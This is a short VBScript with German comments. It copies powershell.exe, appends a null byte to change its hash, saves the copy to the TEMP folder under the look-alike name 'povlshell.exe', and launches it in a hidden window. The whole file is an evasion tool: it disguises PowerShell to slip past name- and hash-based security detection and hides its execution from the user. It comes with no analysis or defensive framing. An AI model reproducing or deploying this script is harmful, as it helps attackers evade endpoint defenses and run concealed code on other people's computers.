Dim Filename
Dim Bytearray
Dim bin
Dim Arraylength
Dim newFilename
Dim dir
Dim name
Dim retval
Dim objShell

Filename = "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"

Set bin = CreateObject("ADODB.Stream")
bin.Type = 1
bin.Open
bin.LoadFromFile Filename

' In eine Variante laden und in ein Byte-Array konvertieren
Bytearray = bin.Read
bin.Close

' Sicherstellen, dass Bytearray ein echtes Array ist
Dim i, tempArray()
ReDim tempArray(UBound(Bytearray))

For i = 0 To UBound(Bytearray)
    tempArray(i) = Bytearray(i)
Next

' Null-Byte anhängen
Arraylength = UBound(tempArray)
ReDim Preserve tempArray(Arraylength + 1)
tempArray(Arraylength + 1) = 0

' Stream erneut öffnen und schreiben
bin.Open
bin.Write tempArray

' Zielverzeichnis für neue Datei setzen
Set objShell = CreateObject("WScript.Shell")
dir = objShell.ExpandEnvironmentStrings("%TEMP%")
name = "povlshell.exe"
newFilename = dir & "\" & name

' Datei speichern
bin.SaveToFile newFilename, 2
bin.Close
Set bin = Nothing

' Datei ausführen
retval = objShell.Run(newFilename, 0, False)
Set objShell = Nothing
